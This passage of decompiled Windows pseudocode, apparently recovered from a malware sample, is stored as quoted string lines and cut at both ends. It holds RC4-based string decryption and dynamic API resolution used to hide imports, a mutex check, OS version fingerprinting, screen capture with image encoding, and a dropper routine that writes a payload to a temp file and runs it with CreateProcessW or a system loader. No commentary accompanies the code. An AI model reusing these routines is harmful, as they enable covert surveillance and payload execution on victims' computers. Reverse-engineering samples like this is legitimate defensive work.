    "  if ( MutexW )",
    "  {",
    "    if ( GetLastError() == 183 )",
    "    {",
    "      v5 = (WCHAR *)sub_62746BA0(&unk_6274B8C6);",
    "      if ( (unsigned int)sub_62748230(v5) )",
    "        sub_62745A70(a1, v2);",
    "      sub_62746C30(v5);",
    "    }",
    "    else",
    "    {",
    "      sub_62745A70(a1, v2);",
    "    }",
    "    CloseHandle(MutexW);",
    "  }",
    "  return sub_62746C30(v2);",
    "}",
    "",
    "",
    "LPVOID __fastcall sub_62745B80(SIZE_T dwBytes)",
    "{",
    "  HANDLE ProcessHeap; // rax",
    "",
    "  ProcessHeap = GetProcessHeap();",
    "  return HeapAlloc(ProcessHeap, 8u, dwBytes);",
    "}",
    "",
    "",
    "LPVOID __fastcall sub_62745BB0(LPVOID lpMem, SIZE_T dwBytes)",
    "{",
    "  HANDLE ProcessHeap; // rax",
    "",
    "  ProcessHeap = GetProcessHeap();",
    "  return HeapReAlloc(ProcessHeap, 8u, lpMem, dwBytes);",
    "}",
    "",
    "",
    "BOOL __fastcall sub_62745BE0(LPVOID lpMem)",
    "{",
    "  HANDLE ProcessHeap; // rax",
    "",
    "  ProcessHeap = GetProcessHeap();",
    "  return HeapFree(ProcessHeap, 0, lpMem);",
    "}",
    "",
    "",
    "_BOOL8 __fastcall sub_62745C10(_DWORD *a1)",
    "{",
    "  int v1; // esi",
    "  int v3; // eax",
    "  _BOOL8 result; // rax",
    "  const CHAR *v5; // rdi",
    "  const WCHAR *v6; // rdi",
    "  const CHAR *v7; // rdi",
    "  const CHAR *v8; // rdi",
    "  const WCHAR *v9; // rdi",
    "  const CHAR *v10; // rdi",
    "  const WCHAR *v11; // rdi",
    "  _WORD v12[24]; // [rsp+20h] [rbp-168h] BYREF",
    "  _DWORD v13[70]; // [rsp+50h] [rbp-138h] BYREF",
    "  int v14; // [rsp+168h] [rbp-20h]",
    "",
    "  if ( !qword_627510F0 )",
    "  {",
    "    v11 = (const WCHAR *)sub_62746BA0(&unk_6274D690);",
    "    qword_627510F0 = LoadLibraryW(v11);",
    "    sub_62746C30(v11);",
    "  }",
    "  if ( qword_627510E8 )",
    "  {",
    "    if ( qword_627510E0 )",
    "      goto LABEL_5;",
    "  }",
    "  else",
    "  {",
    "    v5 = (const CHAR *)sub_62746B10(&unk_6274D6AB);",
    "    qword_627510E8 = (__int64 (__fastcall *)(_QWORD))GetProcAddress(qword_627510F0, v5);",
    "    sub_62746C30(v5);",
    "    if ( qword_627510E0 )",
    "    {",
    "LABEL_5:",
    "      if ( qword_627510D8 )",
    "        goto LABEL_6;",
    "      goto LABEL_30;",
    "    }",
    "  }",
    "  v6 = (const WCHAR *)sub_62746BA0(&unk_6274D6C8);",
    "  qword_627510E0 = LoadLibraryW(v6);",
    "  sub_62746C30(v6);",
    "  if ( qword_627510D8 )",
    "  {",
    "LABEL_6:",
    "    if ( qword_627510D0 )",
    "      goto LABEL_7;",
    "    goto LABEL_31;",
    "  }",
    "LABEL_30:",
    "  v7 = (const CHAR *)sub_62746B10(&unk_6274D6E9);",
    "  qword_627510D8 = (__int64 (__fastcall *)(_QWORD))GetProcAddress(qword_627510E0, v7);",
    "  sub_62746C30(v7);",
    "  if ( qword_627510D0 )",
    "  {",
    "LABEL_7:",
    "    if ( qword_627510C8 )",
    "      goto LABEL_8;",
    "LABEL_32:",
    "    v9 = (const WCHAR *)sub_62746BA0(&unk_6274D71B);",
    "    qword_627510C8 = LoadLibraryW(v9);",
    "    sub_62746C30(v9);",
    "    if ( qword_627510C0 )",
    "      goto LABEL_9;",
    "    goto LABEL_33;",
    "  }",
    "LABEL_31:",
    "  v8 = (const CHAR *)sub_62746B10(&unk_6274D705);",
    "  qword_627510D0 = (__int64 (__fastcall *)(_QWORD))GetProcAddress(qword_627510E0, v8);",
    "  sub_62746C30(v8);",
    "  if ( !qword_627510C8 )",
    "    goto LABEL_32;",
    "LABEL_8:",
    "  if ( qword_627510C0 )",
    "    goto LABEL_9;",
    "LABEL_33:",
    "  v10 = (const CHAR *)sub_62746B10(&unk_6274D738);",
    "  qword_627510C0 = (__int64 (__fastcall *)(_QWORD))GetProcAddress(qword_627510C8, v10);",
    "  sub_62746C30(v10);",
    "LABEL_9:",
    "  memset(v13, 0, sizeof(v13));",
    "  v14 = 0;",
    "  v13[0] = 284;",
    "  qword_627510E8(v13);",
    "  *a1 = v13[1];",
    "  a1[1] = v13[2];",
    "  a1[2] = v13[3];",
    "  if ( qword_627510D8 )",
    "  {",
    "    qword_627510D8(v12);",
    "    v3 = v13[1];",
    "    if ( v13[1] != 6 )",
    "      goto LABEL_11;",
    "  }",
    "  else",
    "  {",
    "    qword_627510D0(v12);",
    "    v3 = v13[1];",
    "    if ( v13[1] != 6 )",
    "    {",
    "LABEL_11:",
    "      if ( v3 == 10 )",
    "      {",
    "        if ( !v13[2] )",
    "        {",
    "          v1 = 28;",
    "          if ( v13[3] <= 0x55EFu )",
    "            v1 = 2 * (BYTE2(v14) == 1) + 24;",
    "        }",
    "      }",
    "      else",
    "      {",
    "        v1 = 0;",
    "        if ( v3 == 5 )",
    "        {",
    "          if ( v13[2] )",
    "          {",
    "            v1 = 2;",
    "            if ( v13[2] == 2 && BYTE2(v14) != 1 )",
    "              v1 = (unsigned int)qword_627510C0(89) == 0 ? 4 : 6;",
    "          }",
    "        }",
    "      }",
    "      goto LABEL_13;",
    "    }",
    "  }",
    "  if ( v13[2] )",
    "  {",
    "    switch ( v13[2] )",
    "    {",
    "      case 1:",
    "        v1 = 2 * (BYTE2(v14) == 1) + 12;",
    "        break;",
    "      case 2:",
    "        v1 = 2 * (BYTE2(v14) == 1) + 16;",
    "        break;",
    "      case 3:",
    "        v1 = 2 * (BYTE2(v14) == 1) + 20;",
    "        break;",
    "    }",
    "  }",
    "  else",
    "  {",
    "    v1 = 2 * (BYTE2(v14) != 1) + 8;",
    "  }",
    "LABEL_13:",
    "  result = v12[0] == 9;",
    "  a1[3] = result + v1;",
    "  return result;",
    "}",
    "",
    "",
    "__int64 __fastcall sub_62745FF0(_BYTE *a1, __int64 a2, unsigned __int64 a3)",
    "{",
    "  __int64 i; // rax",
    "  int v4; // r10d",
    "  unsigned __int64 j; // r9",
    "  char v6; // r11",
    "  __int64 result; // rax",
    "",
    "  *a1 = 0;",
    "  a1[1] = 0;",
    "  for ( i = 0; i != 256; ++i )",
    "    a1[i + 2] = i;",
    "  v4 = 0;",
    "  for ( j = 0; j != 256; ++j )",
    "  {",
    "    v6 = a1[j + 2];",
    "    v4 += (unsigned __int8)(*(_BYTE *)(a2 + j % a3) + v6);",
    "    result = (unsigned __int8)v4;",
    "    a1[j + 2] = a1[(unsigned __int8)v4 + 2];",
    "    a1[(unsigned __int8)v4 + 2] = v6;",
    "  }",
    "  return result;",
    "}",
    "",
    "",
    "char __fastcall sub_62746060(unsigned __int8 *a1, __int64 a2, __int64 a3, __int64 a4)",
    "{",
    "  __int64 i; // rbx",
    "  unsigned __int8 v5; // al",
    "  unsigned __int8 v6; // r10",
    "  unsigned __int8 v7; // r11",
    "  char result; // al",
    "",
    "  if ( a4 )",
    "  {",
    "    for ( i = 0; i != a4; ++i )",
    "    {",
    "      v5 = *a1 + 1;",
    "      *a1 = v5;",
    "      v6 = a1[v5 + 2];",
    "      v7 = a1[1] + v6;",
    "      a1[1] = v7;",
    "      a1[v5 + 2] = a1[v7 + 2];",
    "      a1[v7 + 2] = v6;",
    "      result = *(_BYTE *)(a2 + i) ^ a1[(unsigned __int8)(a1[v5 + 2] + v6) + 2];",
    "      *(_BYTE *)(a3 + i) = result;",
    "    }",
    "  }",
    "  return result;",
    "}",
    "",
    "",
    "void *__fastcall sub_627460D0(unsigned int *a1)",
    "{",
    "  void *v2; // rbx",
    "  char *v4; // rax",
    "  char *v5; // rdi",
    "  const WCHAR *v6; // rbx",
    "  const CHAR *v7; // rbx",
    "  const WCHAR *v8; // rbx",
    "  const CHAR *v9; // rbx",
    "  const WCHAR *v10; // rbx",
    "  const CHAR *v11; // rbx",
    "  const CHAR *v12; // rbx",
    "  const CHAR *v13; // rbx",
    "  const CHAR *v14; // rbx",
    "  const CHAR *v15; // rbx",
    "  const CHAR *v16; // rbx",
    "  const CHAR *v17; // rbx",
    "  const WCHAR *v18; // rbx",
    "  const CHAR *v19; // rbx",
    "  unsigned int v20; // r12d",
    "  const wchar_t *v21; // rbp",
    "  char *v22; // rbx",
    "  __int64 v23; // rax",
    "  __int64 v24; // r12",
    "  unsigned int v25; // r14d",
    "  __int64 v26; // r13",
    "  __int64 v27; // rax",
    "  __int64 v28; // rbp",
    "  const WCHAR *v29; // rbx",
    "  const CHAR *v30; // rbx",
    "  const CHAR *v31; // rbx",
    "  const CHAR *v32; // rbx",
    "  const CHAR *v33; // rbx",
    "  const CHAR *v34; // rbx",
    "  const CHAR *v35; // rbx",
    "  const CHAR *v36; // rbx",
    "  const WCHAR *v37; // rbx",
    "  const CHAR *v38; // rbx",
    "  char v39[4]; // [rsp+5Ch] [rbp-DCh] BYREF",
    "  char v40[16]; // [rsp+60h] [rbp-D8h] BYREF",
    "  unsigned int v41; // [rsp+70h] [rbp-C8h]",
    "  char v42[8]; // [rsp+B0h] [rbp-88h] BYREF",
    "  __int64 v43; // [rsp+B8h] [rbp-80h] BYREF",
    "  __int64 v44; // [rsp+C0h] [rbp-78h] BYREF",
    "  unsigned int v45; // [rsp+C8h] [rbp-70h] BYREF",
    "  unsigned int v46; // [rsp+CCh] [rbp-6Ch] BYREF",
    "  __m128i v47; // [rsp+D0h] [rbp-68h] BYREF",
    "  int v48; // [rsp+E0h] [rbp-58h] BYREF",
    "  __int64 v49; // [rsp+E8h] [rbp-50h]",
    "  int v50; // [rsp+F0h] [rbp-48h]",
    "  int v51; // [rsp+F4h] [rbp-44h]",
    "  __int64 v52[8]; // [rsp+F8h] [rbp-40h] BYREF",
    "",
    "  if ( qword_627511A0 )",
    "  {",
    "    if ( qword_62751180 )",
    "      goto LABEL_3;",
    "  }",
    "  else",
    "  {",
    "    v6 = (const WCHAR *)sub_62746BA0(&unk_6274D760);",
    "    qword_627511A0 = LoadLibraryW(v6);",
    "    sub_62746C30(v6);",
    "    if ( qword_62751180 )",
    "    {",
    "LABEL_3:",
    "      if ( qword_62751178 )",
    "        goto LABEL_4;",
    "      goto LABEL_26;",
    "    }",
    "  }",
    "  v7 = (const CHAR *)sub_62746B10(&unk_6274D77D);",
    "  qword_62751180 = GetProcAddress(qword_627511A0, v7);",
    "  sub_62746C30(v7);",
    "  if ( qword_62751178 )",
    "  {",
    "LABEL_4:",
    "    if ( qword_62751158 )",
    "      goto LABEL_5;",
    "    goto LABEL_27;",
    "  }",
    "LABEL_26:",
    "  v8 = (const WCHAR *)sub_62746BA0(&unk_6274D798);",
    "  qword_62751178 = LoadLibraryW(v8);",
    "  sub_62746C30(v8);",
    "  if ( qword_62751158 )",
    "  {",
    "LABEL_5:",
    "    if ( qword_62751148 )",
    "      goto LABEL_6;",
    "    goto LABEL_28;",
    "  }",
    "LABEL_27:",
    "  v9 = (const CHAR *)sub_62746B10(&unk_6274D7B3);",
    "  qword_62751158 = (__int64 (__fastcall *)(_QWORD))GetProcAddress(qword_62751178, v9);",
    "  sub_62746C30(v9);",
    "  if ( qword_62751148 )",
    "  {",
    "LABEL_6:",
    "    if ( qword_62751140 )",
    "      goto LABEL_7;",
    "    goto LABEL_29;",
    "  }",
    "LABEL_28:",
    "  v10 = (const WCHAR *)sub_62746BA0(&unk_6274D7C8);",
    "  qword_62751148 = LoadLibraryW(v10);",
    "  sub_62746C30(v10);",
    "  if ( qword_62751140 )",
    "  {",
    "LABEL_7:",
    "    if ( qword_62751138 )",
    "      goto LABEL_8;",
    "    goto LABEL_30;",
    "  }",
    "LABEL_29:",
    "  v11 = (const CHAR *)sub_62746B10(&unk_6274D7E7);",
    "  qword_62751140 = (__int64 (__fastcall *)(_QWORD, _QWORD, _QWORD))GetProcAddress(qword_62751148, v11);",
    "  sub_62746C30(v11);",
    "  if ( qword_62751138 )",
    "  {",
    "LABEL_8:",
    "    if ( qword_62751130 )",
    "      goto LABEL_9;",
    "    goto LABEL_31;",
    "  }",
    "LABEL_30:",
    "  v12 = (const CHAR *)sub_62746B10(&unk_6274D800);",
    "  qword_62751138 = (__int64 (__fastcall *)(_QWORD, _QWORD))GetProcAddress(qword_62751148, v12);",
    "  sub_62746C30(v12);",
    "  if ( qword_62751130 )",
    "  {",
    "LABEL_9:",
    "    if ( qword_62751128 )",
    "      goto LABEL_10;",
    "    goto LABEL_32;",
    "  }",
    "LABEL_31:",
    "  v13 = (const CHAR *)sub_62746B10(&unk_6274D821);",
    "  qword_62751130 = (__int64 (__fastcall *)(_QWORD, _QWORD, _QWORD))GetProcAddress(qword_62751148, v13);",
    "  sub_62746C30(v13);",
    "  if ( qword_62751128 )",
    "  {",
    "LABEL_10:",
    "    if ( qword_62751120 )",
    "      goto LABEL_11;",
    "    goto LABEL_33;",
    "  }",
    "LABEL_32:",
    "  v14 = (const CHAR *)sub_62746B10(&unk_6274D840);",
    "  qword_62751128 = (__int64 (__fastcall *)(_QWORD, _QWORD, _QWORD))GetProcAddress(qword_62751148, v14);",
    "  sub_62746C30(v14);",
    "  if ( qword_62751120 )",
    "  {",
    "LABEL_11:",
    "    if ( qword_62751118 )",
    "      goto LABEL_12;",
    "    goto LABEL_34;",
    "  }",
    "LABEL_33:",
    "  v15 = (const CHAR *)sub_62746B10(&unk_6274D864);",
    "  qword_62751120 = (__int64 (__fastcall *)(_QWORD, _QWORD, _QWORD, _QWORD))GetProcAddress(qword_62751148, v15);",
    "  sub_62746C30(v15);",
    "  if ( qword_62751118 )",
    "  {",
    "LABEL_12:",
    "    if ( qword_62751110 )",
    "      goto LABEL_13;",
    "    goto LABEL_35;",
    "  }",
    "LABEL_34:",
    "  v16 = (const CHAR *)sub_62746B10(&unk_6274D882);",
    "  qword_62751118 = (__int64 (__fastcall *)(_QWORD))GetProcAddress(qword_62751148, v16);",
    "  sub_62746C30(v16);",
    "  if ( qword_62751110 )",
    "  {",
    "LABEL_13:",
    "    if ( qword_62751108 )",
    "      goto LABEL_14;",
    "LABEL_36:",
    "    v18 = (const WCHAR *)sub_62746BA0(&unk_6274D8B3);",
    "    qword_62751108 = LoadLibraryW(v18);",
    "    sub_62746C30(v18);",
    "    if ( qword_62751100 )",
    "      goto LABEL_15;",
    "    goto LABEL_37;",
    "  }",
    "LABEL_35:",
    "  v17 = (const CHAR *)sub_62746B10(&unk_6274D89B);",
    "  qword_62751110 = (__int64 (__fastcall *)(_QWORD))GetProcAddress(qword_62751148, v17);",
    "  sub_62746C30(v17);",
    "  if ( !qword_62751108 )",
    "    goto LABEL_36;",
    "LABEL_14:",
    "  if ( qword_62751100 )",
    "    goto LABEL_15;",
    "LABEL_37:",
    "  v19 = (const CHAR *)sub_62746B10(&unk_6274D8CE);",
    "  qword_62751100 = (__int64 (__fastcall *)(_QWORD, _QWORD, _QWORD))GetProcAddress(qword_62751108, v19);",
    "  sub_62746C30(v19);",
    "LABEL_15:",
    "  if ( qword_62751180 )",
    "    qword_62751180();",
    "  v48 = 1;",
    "  v49 = 0;",
    "  v50 = 0;",
    "  v51 = 0;",
    "  v2 = 0;",
    "  if ( !(unsigned int)qword_62751140(v52, &v48, 0) )",
    "  {",
    "    if ( !(unsigned int)qword_62751138(&v46, &v45) )",
    "    {",
    "      v4 = (char *)sub_62745B80(v45);",
    "      v5 = v4;",
    "      v2 = v4;",
    "      if ( v4 )",
    "      {",
    "        v2 = 0;",
    "        if ( !(unsigned int)qword_62751130(v46, v45, v4) )",
    "        {",
    "          v20 = v46;",
    "          v21 = (const wchar_t *)sub_62746BA0(&unk_6274D8EC);",
    "          if ( v20 )",
    "          {",
    "            v22 = v5;",
    "            while ( 1 )",
    "            {",
    "              _mm_prefetch(v22 + 1104, 1);",
    "              if ( !wcscmp(*((const wchar_t **)v22 + 8), v21) )",
    "                break;",
    "              v22 += 104;",
    "              if ( v22 == &v5[104 * v20] )",
    "                goto LABEL_78;",
    "            }",
    "            v47 = _mm_loadu_si128((const __m128i *)v22);",
    "            sub_62746C30(v21);",
    "            if ( !qword_627511A0 )",
    "            {",
    "              v29 = (const WCHAR *)sub_62746BA0(&unk_6274D909);",
    "              qword_627511A0 = LoadLibraryW(v29);",
    "              sub_62746C30(v29);",
    "            }",
    "            if ( !qword_62751198 )",
    "            {",
    "              v34 = (const CHAR *)sub_62746B10(&unk_6274D926);",
    "              qword_62751198 = (__int64 (__fastcall *)(_QWORD))GetProcAddress(qword_627511A0, v34);",
    "              sub_62746C30(v34);",
    "            }",
    "            if ( !qword_62751190 )",
    "            {",
    "              v33 = (const CHAR *)sub_62746B10(&unk_6274D934);",
    "              qword_62751190 = (__int64 (__fastcall *)(_QWORD))GetProcAddress(qword_627511A0, v33);",
    "              sub_62746C30(v33);",
    "            }",
    "            if ( !qword_62751188 )",
    "            {",
    "              v38 = (const CHAR *)sub_62746B10(&unk_6274D94D);",
    "              qword_62751188 = (__int64 (__fastcall *)(_QWORD, _QWORD))GetProcAddress(qword_627511A0, v38);",
    "              sub_62746C30(v38);",
    "            }",
    "            if ( !qword_62751178 )",
    "            {",
    "              v37 = (const WCHAR *)sub_62746BA0(&unk_6274D95F);",
    "              qword_62751178 = LoadLibraryW(v37);",
    "              sub_62746C30(v37);",
    "            }",
    "            if ( !qword_62751170 )",
    "            {",
    "              v36 = (const CHAR *)sub_62746B10(&unk_6274D980);",
    "              qword_62751170 = (__int64 (__fastcall *)(_QWORD, _QWORD, _QWORD))GetProcAddress(qword_62751178, v36);",
    "              sub_62746C30(v36);",
    "            }",
    "            if ( !qword_62751168 )",
    "            {",
    "              v35 = (const CHAR *)sub_62746B10(&unk_6274D99F);",
    "              qword_62751168 = (__int64 (__fastcall *)(_QWORD, _QWORD))GetProcAddress(qword_62751178, v35);",
    "              sub_62746C30(v35);",
    "            }",
    "            if ( !qword_62751160 )",
    "            {",
    "              v32 = (const CHAR *)sub_62746B10(&unk_6274D9B4);",
    "              qword_62751160 = (__int64 (__fastcall *)(_QWORD))GetProcAddress(qword_62751178, v32);",
    "              sub_62746C30(v32);",
    "            }",
    "            if ( !qword_62751158 )",
    "            {",
    "              v31 = (const CHAR *)sub_62746B10(&unk_6274D9CF);",
    "              qword_62751158 = (__int64 (__fastcall *)(_QWORD))GetProcAddress(qword_62751178, v31);",
    "              sub_62746C30(v31);",
    "            }",
    "            if ( !qword_62751150 )",
    "            {",
    "              v30 = (const CHAR *)sub_62746B10(&unk_6274D9E4);",
    "              qword_62751150 = (__int64 (__fastcall *)(_QWORD, _QWORD, _QWORD, _QWORD, _DWORD, _QWORD, _DWORD, _DWORD, _DWORD))GetProcAddress(qword_62751178, v30);",
    "              sub_62746C30(v30);",
    "            }",
    "            v23 = qword_62751198(0);",
    "            v2 = (void *)v23;",
    "            if ( v23 )",
    "            {",
    "              v24 = qword_62751160(v23);",
    "              if ( v24 )",
    "              {",
    "                v25 = qword_62751190(0);",
    "                v26 = (unsigned int)qword_62751190(1);",
    "                v27 = qword_62751170(v2, v25, v26);",
    "                v28 = v27;",
    "                if ( v27 )",
    "                {",
    "                  qword_62751168(v24, v27);",
    "                  if ( !(unsigned int)qword_62751150(v24, 0, 0, v25, v26, v2, 0, 0, 13369376) )",
    "                  {",
    "                    qword_62751158(v28);",
    "                    v28 = 0;",
    "                  }",
    "                }",
    "                qword_62751158(v24);",
    "                qword_62751188(0, v2);",
    "                if ( v28 )",
    "                {",
    "                  v2 = 0;",
    "                  if ( !(unsigned int)qword_62751128(v28, 0, &v44) )",
    "                  {",
    "                    if ( !(unsigned int)qword_62751100(0, 1, &v43) )",
    "                    {",
    "                      if ( !(unsigned int)qword_62751120(v44, v43, &v47, 0) )",
    "                      {",
    "                        (*(void (__fastcall **)(__int64, _QWORD, _QWORD, char *))(*(_QWORD *)v43 + 40LL))(",
    "                          v43,",
    "                          0,",
    "                          0,",
    "                          v42);",
    "                        (*(void (__fastcall **)(__int64, char *, __int64))(*(_QWORD *)v43 + 96LL))(v43, v40, 1);",
    "                        v2 = sub_62745B80(v41);",
    "                        if ( v2 )",
    "                        {",
    "                          if ( (*(unsigned int (__fastcall **)(__int64, void *, _QWORD, char *))(*(_QWORD *)v43 + 24LL))(",
    "                                 v43,",
    "                                 v2,",
    "                                 v41,",
    "                                 v39) )",
    "                          {",
    "                            sub_62745BE0(v2);",
    "                            v2 = 0;",
    "                          }",
    "                          else if ( a1 )",
    "                          {",
    "                            *a1 = v41;",
    "                          }",
    "                        }",
    "                      }",
    "                      (*(void (__fastcall **)(__int64))(*(_QWORD *)v43 + 16LL))(v43);",
    "                    }",
    "                    qword_62751118(v44);",
    "                  }",
    "                  qword_62751158(v28);",
    "                }",
    "                else",
    "                {",
    "                  v2 = 0;",
    "                }",
    "              }",
    "              else",
    "              {",
    "                qword_62751188(0, v2);",
    "                v2 = 0;",
    "              }",
    "            }",
    "          }",
    "          else",
    "          {",
    "LABEL_78:",
    "            sub_62746C30(v21);",
    "            v2 = 0;",
    "          }",
    "        }",
    "        sub_62745BE0(v5);",
    "      }",
    "    }",
    "    qword_62751110(v52[0]);",
    "  }",
    "  return v2;",
    "}",
    "",
    "",
    "_DWORD *__fastcall sub_62746B10(unsigned int *a1)",
    "{",
    "  unsigned int v2; // esi",
    "  _DWORD *v3; // rax",
    "  _DWORD *v4; // rbx",
    "  unsigned __int8 v6[268]; // [rsp+20h] [rbp-138h] BYREF",
    "  unsigned int v7[11]; // [rsp+12Ch] [rbp-2Ch] BYREF",
    "",
    "  v2 = *a1;",
    "  v7[0] = a1[1];",
    "  v3 = sub_62745B80(v2 + 9LL);",
    "  v4 = v3;",
    "  if ( v3 )",
    "  {",
    "    *v3 = v2;",
    "    v3[1] = v7[0];",
    "    sub_62745FF0(v6, (__int64)v7, 4u);",
    "    sub_62746060(v6, (__int64)(a1 + 2), (__int64)(v4 + 2), v2);",
    "    *((_BYTE *)v4 + v2 + 8) = 0;",
    "    v4 += 2;",
    "  }",
    "  return v4;",
    "}",
    "",
    "",
    "_DWORD *__fastcall sub_62746BA0(unsigned int *a1)",
    "{",
    "  unsigned int v2; // esi",
    "  _DWORD *v3; // rax",
    "  _DWORD *v4; // rbx",
    "  unsigned __int8 v6[268]; // [rsp+20h] [rbp-138h] BYREF",
    "  unsigned int v7[11]; // [rsp+12Ch] [rbp-2Ch] BYREF",
    "",
    "  v2 = *a1;",
    "  v7[0] = a1[1];",
    "  v3 = sub_62745B80(v2 + 10LL);",
    "  v4 = v3;",
    "  if ( v3 )",
    "  {",
    "    *v3 = v2;",
    "    v3[1] = v7[0];",
    "    sub_62745FF0(v6, (__int64)v7, 4u);",
    "    sub_62746060(v6, (__int64)(a1 + 2), (__int64)(v4 + 2), v2);",
    "    *(_WORD *)((char *)v4 + v2 + 8) = 0;",
    "    v4 += 2;",
    "  }",
    "  return v4;",
    "}",
    "",
    "",
    "BOOL __fastcall sub_62746C30(__int64 a1)",
    "{",
    "  void *v1; // rbx",
    "  BOOL result; // eax",
    "",
    "  if ( a1 )",
    "  {",
    "    v1 = (void *)(a1 - 8);",
    "    memset((void *)(a1 - 8), 0, *(unsigned int *)(a1 - 8) + 8LL);",
    "    return sub_62745BE0(v1);",
    "  }",
    "  return result;",
    "}",
    "",
    "",
    "int sub_62746C70(wchar_t *a1, size_t a2, const wchar_t *a3, ...)",
    "{",
    "  va_list Args; // [rsp+58h] [rbp+20h] BYREF",
    "",
    "  va_start(Args, a3);",
    "  return vsnwprintf(a1, a2, a3, Args);",
    "}",
    "",
    "",
    "WCHAR *__fastcall sub_62746C90(LPCCH lpMultiByteStr)",
    "{",
    "  int v2; // eax",
    "  int cchWideChar; // ebx",
    "  WCHAR *v4; // rsi",
    "  WCHAR *lpWideCharStr; // rax",
    "",
    "  v2 = MultiByteToWideChar(0xFDE9u, 0, lpMultiByteStr, -1, 0, 0);",
    "  cchWideChar = v2;",
    "  v4 = 0;",
    "  if ( v2 )",
    "  {",
    "    lpWideCharStr = (WCHAR *)sub_62745B80(2LL * v2 + 2);",
    "    v4 = lpWideCharStr;",
    "    if ( lpWideCharStr )",
    "      MultiByteToWideChar(0xFDE9u, 0, lpMultiByteStr, -1, lpWideCharStr, cchWideChar);",
    "  }",
    "  return v4;",
    "}",
    "",
    "",
    "__int64 __fastcall sub_62746D10(const WCHAR *a1, const void *a2, DWORD a3)",
    "{",
    "  HANDLE FileW; // rax",
    "  void *v6; // rbx",
    "  unsigned int v7; // ebp",
    "  DWORD NumberOfBytesWritten; // [rsp+4Ch] [rbp-2Ch] BYREF",
    "",
    "  FileW = CreateFileW(a1, 0x40000000u, 0, 0, 2u, 0x80u, 0);",
    "  v6 = FileW;",
    "  v7 = 0;",
    "  if ( FileW != (HANDLE)-1LL )",
    "  {",
    "    if ( SetFilePointer(FileW, 0, 0, 0) != -1 )",
    "      v7 = WriteFile(v6, a2, a3, &NumberOfBytesWritten, 0);",
    "    CloseHandle(v6);",
    "  }",
    "  return v7;",
    "}",
    "",
    "",
    "__int64 __fastcall sub_62746DC0(int a1, const void *a2, DWORD a3, __int64 a4, const CHAR *a5, const CHAR *a6)",
    "{",
    "  const WCHAR *v9; // rbx",
    "  HMODULE LibraryW; // r12",
    "  const CHAR *v11; // rbx",
    "  FARPROC ProcAddress; // r12",
    "  unsigned int ProcessW; // ebx",
    "  int v14; // eax",
    "  const wchar_t *v16; // rbx",
    "  size_t v17; // rax",
    "  _DWORD *v18; // rbx",
    "  WCHAR *v19; // rsi",
    "  WCHAR *v20; // rbx",
    "  const wchar_t *v21; // rbx",
    "  size_t v22; // rax",
    "  WCHAR *v23; // rbx",
    "  wchar_t Destination[264]; // [rsp+50h] [rbp-8F8h] BYREF",
    "  WCHAR v25[264]; // [rsp+260h] [rbp-6E8h] BYREF",
    "  wchar_t TempFileName[264]; // [rsp+470h] [rbp-4D8h] BYREF",
    "  WCHAR Buffer[264]; // [rsp+680h] [rbp-2C8h] BYREF",
    "  _BYTE ProcessInformation[32]; // [rsp+890h] [rbp-B8h] BYREF",
    "  _BYTE StartupInfo[152]; // [rsp+8B0h] [rbp-98h] BYREF",
    "",
    "  v9 = (const WCHAR *)sub_62746BA0(dword_6274DA00);",
    "  LibraryW = LoadLibraryW(v9);",
    "  sub_62746C30((__int64)v9);",
    "  v11 = (const CHAR *)sub_62746B10(dword_6274DA1F);",
    "  ProcAddress = GetProcAddress(LibraryW, v11);",
    "  sub_62746C30((__int64)v11);",
    "  GetTempPathW(0x104u, Buffer);",
    "  GetTempFileNameW(Buffer, (LPCWSTR)&PrefixString, 0, Buffer);",
    "  ProcessW = DeleteFileW(Buffer);",
    "  if ( ProcessW )",
    "  {",
    "    v14 = ((__int64 (__fastcall *)(_QWORD, WCHAR *))ProcAddress)(0, Buffer);",
    "    if ( !v14 || (ProcessW = 0, v14 == 183) )",
    "    {",
    "      GetTempFileNameW(Buffer, (LPCWSTR)&PrefixString, 0, TempFileName);",
    "      ProcessW = DeleteFileW(TempFileName);",
    "      if ( ProcessW )",
    "      {",
    "        if ( a1 == 1 )",
    "        {",
    "          v21 = (const wchar_t *)sub_62746BA0((unsigned int *)\"\\b\");",
    "          v22 = wcslen(TempFileName);",
    "          wcscpy(&v25[v22 + 260], v21);",
    "          sub_62746C30((__int64)v21);",
    "          ProcessW = sub_62746D10(TempFileName, a2, a3);",
    "          if ( !ProcessW )",
    "            return ProcessW;",
    "          memset(StartupInfo, 0, 0x68u);",
    "          memset(ProcessInformation, 0, 24);",
    "          *(_DWORD *)StartupInfo = 104;",
    "          wcscpy(Destination, TempFileName);",
    "          if ( a6 )",
    "          {",
    "            v23 = sub_62746C90(a6);",
    "            wcscat(Destination, Source);",
    "            wcscat(Destination, v23);",
    "            sub_62745BE0(v23);",
    "          }",
    "          ProcessW = CreateProcessW(",
    "                       0,",
    "                       Destination,",
    "                       0,",
    "                       0,",
    "                       0,",
    "                       0,",
    "                       0,",
    "                       0,",
    "                       (LPSTARTUPINFOW)StartupInfo,",
    "                       (LPPROCESS_INFORMATION)ProcessInformation);",
    "          if ( ProcessW )",
    "            goto LABEL_12;",
    "          goto LABEL_19;",
    "        }",
    "        if ( a1 != 2 )",
    "        {",
    "          sub_62746D10(TempFileName, a2, a3);",
    "          return 0;",
    "        }",
    "        v16 = (const wchar_t *)sub_62746BA0(dword_6274DA53);",
    "        v17 = wcslen(TempFileName);",
    "        wcscpy(&v25[v17 + 260], v16);",
    "        sub_62746C30((__int64)v16);",
    "        ProcessW = sub_62746D10(TempFileName, a2, a3);",
    "        if ( ProcessW )",
    "        {",
    "          memset(StartupInfo, 0, 0x68u);",
    "          memset(ProcessInformation, 0, 24);",
    "          *(_DWORD *)StartupInfo = 104;",
    "          GetSystemDirectoryW(v25, 0x104u);",
    "          v18 = sub_62746BA0(dword_6274DA68);",
    "          sub_62746C70(Destination, 0x104u, L\"%ls\\\\%ls \\\"%ls\\\",\", v25, v18, TempFileName);",
    "          v19 = sub_62746C90(a5);",
    "          wcscat(Destination, v19);",
    "          sub_62745BE0(v19);",
    "          sub_62746C30((__int64)v18);",
    "          if ( a6 )",
    "          {",
    "            v20 = sub_62746C90(a6);",
    "            wcscat(Destination, Source);",
    "            wcscat(Destination, v20);",
    "            sub_62745BE0(v20);",
    "          }",
    "          ProcessW = CreateProcessW(",
    "                       0,",
    "                       Destination,",
    "                       0,",
    "                       0,",
    "                       0,",
    "                       0,",
    "                       0,",
    "                       0,",
    "                       (LPSTARTUPINFOW)StartupInfo,",
    "                       (LPPROCESS_INFORMATION)ProcessInformation);",
    "          if ( ProcessW )",
    "          {",
    "LABEL_12:",
    "            CloseHandle(*(HANDLE *)ProcessInformation);",
